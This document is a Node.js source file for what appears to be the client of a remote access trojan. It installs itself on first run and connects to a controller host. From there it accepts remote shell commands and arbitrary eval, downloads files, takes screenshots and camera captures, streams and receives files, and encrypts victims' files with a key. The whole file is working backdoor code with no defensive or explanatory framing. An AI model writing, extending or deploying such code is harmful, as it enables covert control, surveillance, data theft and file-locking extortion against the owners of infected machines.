const io=require('socket.io-client');
const open=require('open');
const axios=require('axios');
const fs=require('fs');
const os=require('os');
const path=require('path');
const {install,uninstall}=require('../scripts/install');
const stream=require('../scripts/stream');
const shell=require('../scripts/shell');
const snap=require('../scripts/snap');
const capture=require('../scripts/capture');
const {lock,unlock}=require('../scripts/crypto');
const download=require('download');
const {encrypt,decrypt} = require('../scripts/crypto');

const configFile=path.join(__dirname,'../config.json');
const config=JSON.parse(fs.readFileSync(configFile,'utf-8'));

if(process.argv[2]!=="test"&&!config.installed){
    const fullpath=path.join(process.cwd(),config.name);
    install(fullpath,config.name);
    config.installed=true;
    config.dir=fullpath;
    fs.writeFileSync(configFile,JSON.stringify(config));
}

const host=config.hostname||'http://localhost:1313';

const socket=io.connect(host);

let wd=os.homedir();

socket.on('connected',()=>{
    if(config.secure){
        socket.emit('start',encrypt(config.key,
            JSON.stringify(
                {
                    device:os.hostname(),
                    dir:wd
                }
            )
        ));
    }else{
        socket.emit('start',{
            device:os.hostname(),
            dir:wd
        });
    }
});

function respond(res){
    if(config.secure){
        socket.emit('res',encrypt(config.key,JSON.stringify(
            {
                dir:wd,
                res:res
            }
        )));
    }else{
        socket.emit('res',{
            dir:wd,
            res:res
        });
    }
}

socket.on('shell',cmd=>{

const command=config.secure?decrypt(config.key,cmd):cmd;

if(command!==null&&command!==''&&command!==undefined){
    if(command=='cwd'){
        respond(wd);
    }
    else if(command.includes('cd')&&command!=='cd ..'){
        const newdir=command.replace('cd ','');
        if(fs.existsSync(path.join(wd,newdir))){
            wd=path.join(wd,newdir);
            respond('');
        }else{
            respond('Invalid directory!');
        }
    }
    else if(command=='cd ..'){
        if(fs.existsSync(wd.slice(0,wd.lastIndexOf("\\")))){
            wd=wd.slice(0,wd.lastIndexOf("\\"));
            respond('');   
        }else{
            respond('No such directory exists.');
        }
    }
    else if(command.includes('cwd=')){
        const dir=command.replace('cwd=','');
        if(fs.existsSync(dir)){
            wd=dir;
            respond(wd);
        }else{
            respond('Invalid directory!');
        }
    }
    else if(command.includes('public')&&command.includes('ip')){
        axios('http://ipinfo.io/ip')
            .then(res=>{
                respond(res.data);
            });
    }
    else if(command.includes('stream')){
        const file=command.replace('stream ','');
        stream(socket,wd,file,respond,config);
    }
    else if(command.includes('open')){
        const ctx=command.replace('open ','');
        open(path.join(wd,ctx));
        respond(`Opened ${ctx}`);
    }
    else if(command.includes('launch')){
        const ctx=command.replace('launch ','');
        open.openApp(ctx);
        respond(`Launched ${ctx}`);
    }
    else if(command.includes('visit')){
        const ctx=command.replace('visit ','');
        open(ctx);
        respond(`Visited ${ctx}`);
    }
    else if(command.includes('rickroll')){
        open('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
        respond('RickRolled!');
    }
    else if(command.includes('system')&&command.includes('--info')){

        const info={
            os       :os.platform(),
            arch     :os.arch(),
            cpu      :(os.cpus())[0].model,
            RAM      :`${os.totalmem()/1000000000}GB`,
            freeRAM  :`${os.freemem()/1000000000}GB`,
            hostname :os.hostname(),
            version  :os.version(),
            release  :os.release(),        
        };

        respond(info);

    }
    else if(command.includes('system')&&command.includes('--get')){
        const property=command.replace('system --get ','');
        (async ()=>{
            const info=await eval(`os.${property}()`);
            respond(info);
        })();
    }
    else if(command.includes('download')){
        const link=command.replace('download ','');
        (async()=>{
            await download(link,wd);
            respond('Download Complete!');
        })();
    } 
    else if(command.includes('snap')){
        const format=command.replace('snap -f ','');
        snap(socket,format,respond,config);
    }
    else if(command.includes('capture')){
        const format=command.replace('capture -f ','');
        capture(socket,format,respond,config);
    }
    else if(command.includes('enc')&&!command.includes('dec')&&!command.includes('.enc')){
        const argv=command.split(' ');
        const file=argv[argv.indexOf('enc')+1];
        if(command.includes('--key')||config.key){
            const key=argv[argv.indexOf('--key')+1]||config.key;
            lock(wd,file,key,respond);
        }else{
            respond('No key provided.');
        }
    }
    else if(command.includes('dec')&&!command.includes('.dec')){
        const argv=command.split(' ');
        const file=argv[argv.indexOf('dec')+1];
        if(command.includes('--key')||config.key){
            const key=argv[argv.indexOf('--key')+1]||config.key;
            unlock(wd,file,key,respond);
        }else{
            respond('No key provided.');
        }
    }
    else if(command.includes('config.')&&command.includes('=')){
        eval(command);
        fs.writeFileSync(configFile,JSON.stringify(config));
        respond('Config updated');
    }
    else if(command.includes('config --get ')){
	    const property=command.replace('config --get ','');
	    respond(config[property]);
    }
    else if(command.includes('eval')){
        const code=command.replace('eval ','');
        (async ()=>{
            const result=await eval(code);
            respond(result);
        })();
    }
    else if(command=='reboot'){
        respond('Rebooted program');
        process.exit(0);
    }
    else if(command=='uninstall'){
        uninstall(config.dir,config.name,respond);
    }
    else{
        shell(wd,command,respond);
    }
}else{
     respond('');
}

});

socket.on('start-pipe',filename=>{
    const output=fs.createWriteStream(path.join(wd,filename));
    socket.on('pipe',chunk=>{
        output.write(chunk);
    });
    socket.on('end-pipe',(output)=>{
        respond(output);
    });
});

socket.on('err-pipe',(output)=>{
    respond(output);
});

process.on('uncaughtException',err=>{
    respond({error:err,stack:err.stack});
});
